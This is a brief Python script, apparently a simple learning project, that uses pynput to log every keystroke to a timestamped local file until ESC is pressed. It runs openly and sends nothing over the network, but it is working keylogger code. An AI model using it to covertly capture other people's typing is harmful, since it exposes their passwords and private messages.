from pynput import keyboard
import os
from datetime import datetime

LOG_DIR = "raw_keylogs"


timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
LOG_FILE = os.path.join(LOG_DIR, f"keylog_{timestamp}.txt")

def save_to_file(text):
    try:
         with open(LOG_FILE,'a',encoding='utf-8') as f:
              f.write(text)
    except Exception as e:
        print(f'Error written to file: {e}')

def logger(key):
     try:
            save_to_file(key.char)
     except AttributeError:
          save_to_file(f'[{key}]')

def stop(key):
    if key == keyboard.Key.esc:
        print("\nLogging stopped.")
        return False
    

if __name__ == "__main__":
    # Create/clear log file at start
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write(f"Key log started at {datetime.now()}\n")

    print("Key logging started. Press ESC to stop.")
    with keyboard.Listener(on_press=logger, on_release=stop) as listener:
        listener.join()

    print(f"Keystrokes saved to {os.path.abspath(LOG_FILE)}")